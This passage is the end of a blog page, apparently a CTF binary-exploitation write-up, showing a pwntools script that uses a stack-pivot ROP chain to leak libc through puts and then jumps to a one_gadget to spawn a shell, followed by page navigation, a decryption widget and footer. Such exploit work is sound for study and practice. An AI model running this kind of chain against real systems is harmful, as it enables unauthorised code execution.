</span><span>        gdb.</span><span style="color:#bf616a;">attach</span><span>(io, </span><span style="color:#bf616a;">gdbscript</span><span>=gdbscript)
</span><span>    </span><span style="color:#b48ead;">return </span><span>io
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">start</span><span>(</span><span style="color:#bf616a;">argv</span><span>=[], *</span><span style="color:#bf616a;">a</span><span>, **</span><span style="color:#bf616a;">kw</span><span>):
</span><span>    </span><span style="color:#65737e;">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">LOCAL</span><span>:
</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">start_local</span><span>(argv, *a, **kw)
</span><span>    </span><span style="color:#b48ead;">else</span><span>:
</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">start_remote</span><span>(argv, *a, **kw)
</span><span>
</span><span>gdbscript = &#39;&#39;&#39;
</span><span style="color:#a3be8c;">tbreak main
</span><span style="color:#a3be8c;">tbreak *main+88
</span><span style="color:#a3be8c;">continue
</span><span>&#39;&#39;&#39;.</span><span style="color:#bf616a;">format</span><span>(**</span><span style="color:#96b5b4;">locals</span><span>())
</span><span>
</span><span style="color:#65737e;"># -- Exploit goes here --
</span><span>
</span><span>io = </span><span style="color:#bf616a;">start</span><span>()
</span><span>
</span><span>landing_addr = </span><span style="color:#d08770;">0x404038
</span><span>print_addr   = </span><span style="color:#d08770;">0x404010
</span><span>print_call   = </span><span style="color:#d08770;">0x401211
</span><span>pop_rbp_ret  = </span><span style="color:#d08770;">0x40115d
</span><span>gets_call    = </span><span style="color:#d08770;">0x401205
</span><span>add_rsp_8    = </span><span style="color:#d08770;">0x401016
</span><span>leave_ret    = </span><span style="color:#d08770;">0x4011cd
</span><span>
</span><span style="color:#65737e;">### Set rbp to 0x404058 ###
</span><span>
</span><span>first_stage_payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">0x28</span><span>: [
</span><span>        pop_rbp_ret,
</span><span>        landing_addr+</span><span style="color:#d08770;">0x20</span><span>,
</span><span>        gets_call
</span><span>        ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(first_stage_payload)
</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">first stage out: </span><span>{io.</span><span style="color:#bf616a;">recv</span><span>()}&#39;)
</span><span>
</span><span>second_stage_payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">0</span><span>: [
</span><span>        pop_rbp_ret,
</span><span>        landing_addr+</span><span style="color:#d08770;">0x118</span><span>,
</span><span>        leave_ret
</span><span>        ],
</span><span>    </span><span style="color:#d08770;">0x20</span><span>:[
</span><span>        print_addr+</span><span style="color:#d08770;">0x20</span><span>,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8, </span><span style="color:#65737e;">#this one last
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8, </span><span style="color:#65737e;"># success with rop
</span><span>        print_call,
</span><span>        </span><span style="color:#65737e;">#0x4141414141414141,
</span><span>        exe.sym.main,
</span><span>        </span><span style="color:#d08770;">0x4242424242424242</span><span>,
</span><span>        ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(second_stage_payload)
</span><span>
</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">second stage out: </span><span>{io.</span><span style="color:#bf616a;">recvline</span><span>()}&#39;)
</span><span>
</span><span>libc_puts_addr = </span><span style="color:#bf616a;">u64</span><span>(io.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>,</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
</span><span>
</span><span>log.</span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">LIBC LEAKED PUTS ADDR: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(libc_puts_addr)}&#39;)
</span><span>
</span><span>libc_base_addr = libc_puts_addr - libc.sym.puts
</span><span>
</span><span>log.</span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">LIBC BASE ADDR: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(libc_base_addr)}&#39;)
</span><span>
</span><span>libc.address = libc_base_addr
</span><span>
</span><span>one_gadget_offset = </span><span style="color:#d08770;">0xef52b
</span><span>
</span><span>execve_addr = libc_base_addr + one_gadget_offset
</span><span>
</span><span>final_payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">0x28</span><span>: [
</span><span>        pop_rbp_ret,
</span><span>        landing_addr+</span><span style="color:#d08770;">0x150</span><span>,
</span><span>        execve_addr
</span><span>           ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(final_payload)
</span><span>
</span><span>
</span><span>io.</span><span style="color:#bf616a;">interactive</span><span>()
</span></code></pre>
</section>
  <hr />
  <!-- Post Taxonomies -->

  <!-- Post Nav -->
<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
  <a
    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
    href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/" accesskey=","
    ><span class="mr-1.5">&#8249;</span><span>HackTheBox Scepter Writeup</span></a>
  <a
    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
    href="https://ismailbozkurt.github.io/blog/docker-for-binaryexploitation/" accesskey="."
    ><span>Docker for Binary Exploitation</span><span class="ml-1.5">&#8250;</span></a>
</nav>

  <!-- Begin Page End inject -->
  
<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>
<script>
  mediumZoom('img:not(.no-zoom)', {
    margin: 24,
    background: 'rgba(0, 0, 0, 0.9)',
    scrollOffset: 40,
  });
</script>
<!-- Only runs if .encrypted-content exists -->
<script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    function showDecryptionUI(block) {
      block.innerHTML = `<div style="padding: 1rem; border: 1px solid #444; border-radius: 8px; background: #1e1e1e;">
  <label style="display:block; margin-bottom:0.8rem; font-weight:600; font-size:1.1rem; color:#f5f5f5;">
    🔒 This content is password-protected:
  </label>
  <div style="display: flex; align-items: center; gap: 0.75rem;">
    <input type="password" id="decrypt-password" placeholder="Enter password"
           style="flex: 1; padding: 0.6rem 0.8rem; font-size: 1rem; background: #2a2a2a; color: #eee; border: 1px solid #555; border-radius: 4px;">
    <button id="decrypt-button"
            style="padding: 0.6rem 1rem; background: #2d2d2d; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
      Decrypt
    </button>
    <div style="display: flex; align-items: center;">
      <input type="checkbox" id="show-pw" style="margin-left: 0.4rem; cursor: pointer;">
      <label for="show-pw" title="Show password" style="margin-left: 0.4rem; font-size: 1.2rem; cursor: pointer;">👁️</label>
    </div>
  </div>
  <div id="decrypt-error" style="color: #ff6b6b; margin-top: 0.75rem;"></div>
</div>
`;
      var input = block.querySelector('input[type="password"]');
      var button = block.querySelector('button');
      var error = block.querySelector('#decrypt-error');
      var showPw = block.querySelector('#show-pw');
      showPw.onchange = function () {
        input.type = this.checked ? 'text' : 'password';
      };
      button.onclick = function () {
        var password = input.value;
        var ciphertext_b64 = block.getAttribute('data-encrypted');
        try {
          var ciphertext = CryptoJS.enc.Base64.parse(ciphertext_b64);
          var iv = CryptoJS.lib.WordArray.create(ciphertext.words.slice(0, 4), 16);
          var actualCiphertext = CryptoJS.lib.WordArray.create(ciphertext.words.slice(4), ciphertext.sigBytes - 16);
          var key = CryptoJS.SHA256(password);
          var bytes = CryptoJS.AES.decrypt({ ciphertext: actualCiphertext }, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
          var plaintext = bytes.toString(CryptoJS.enc.Utf8);
          if (!plaintext) throw new Error('Incorrect password or corrupt data');

          plaintext = plaintext.replace(/!\[\[(.*?)\]\]/g, (match, p1) => {
            const src = p1.match(/^\//) ? p1 : '/assets/images/' + p1;
            return `![](${src})`;
          });
          plaintext = plaintext.replace(/\[\[(.*?)\]\]/g, (match, p1) => {
            const href = '/' + p1.trim().replace(/\s+/g, '-').toLowerCase();
            return `[${p1}](${href})`;
          });
          plaintext = plaintext.replace(/!\[\]\((data:image\/[^)]+)\)/g, (match, dataUri) => {
            return `<img src="${dataUri}" style="max-width:100%; border-radius:8px; margin:1rem 0;">`;
          });

          if (window.marked) {
            block.innerHTML = '<div class="post-content">' + marked.parse(plaintext) + '</div>';
          } else {
            block.innerHTML = '<pre>' + plaintext + '</pre>';
            return;
          }
          
          mediumZoom('img:not(.no-zoom)', {
          margin: 24,
          background: 'rgba(0, 0, 0, 0.9)',
          scrollOffset: 40,
          });

          // ▼▼▼ Inject TOC based on headings ▼▼▼
          const tocContainer = document.createElement('nav');
          tocContainer.className = 'toc';
          const headers = block.querySelectorAll('.post-content h1, .post-content h2, .post-content h3');
          if (headers.length > 0) {
            const tocList = document.createElement('ul');
            headers.forEach(h => {
              if (!h.id) {
                h.id = h.textContent.trim().toLowerCase().replace(/\s+/g, '-');
              }
              const li = document.createElement('li');
              li.style.marginLeft = h.tagName === 'H3' ? '1.2em' : h.tagName === 'H2' ? '0.6em' : '0';
              const a = document.createElement('a');
              a.href = '#' + h.id;
              a.textContent = h.textContent;
              li.appendChild(a);
              tocList.appendChild(li);
            });
            tocContainer.innerHTML = `<strong style="display:block;margin-bottom:0.5em;">▼ Table of Contents</strong>`;
            tocContainer.appendChild(tocList);
            block.prepend(tocContainer);
          }
          // ▲▲▲ TOC Injection End ▲▲▲

        } catch (e) {
          let msg = e.message?.match(/utf-?8/i) ? 'Decryption failed' : '❌ ' + (e.message || 'Incorrect password or corrupt data');
          error.textContent = msg;
          error.style.display = 'block';
        }
      };
    }

    document.querySelectorAll('.encrypted-content').forEach(showDecryptionUI);
  });
</script>

<!-- Share page -->
<br>
<div class="robots-nocontent social-share-buttons">
  <b>Share this content</b>
  <br>
  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
    <a class="a2a_button_x"></a>
    <a class="a2a_button_linkedin"></a>
    <a class="a2a_button_telegram"></a>
    <a class="a2a_button_mastodon"></a>
    <a class="a2a_button_email"></a>
    <a class="a2a_button_microsoft_teams"></a>
    <a class="a2a_button_threads"></a>
    <a class="a2a_button_bluesky"></a>
    <a class="a2a_button_whatsapp"></a>
  </div>
  <br>
  <script async src="https://static.addtoany.com/menu/page.js"></script>
</div>


  <!-- End Page End inject -->
</article>

  </main>
  <!-- Footer -->
<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
  <div class="mr-auto basis-full lg:basis-1/2">
  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time></a>
  </div>
  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
    <span class="mr-6 lg:ml-6">
      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
    </span>
    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
  </div>
  <!-- Begin Footer inject -->
  
  <!-- End Footer inject -->
</footer>

  

  <!-- Begin Body End inject -->
  
  <!-- End Body End inject -->
</body>

</html>
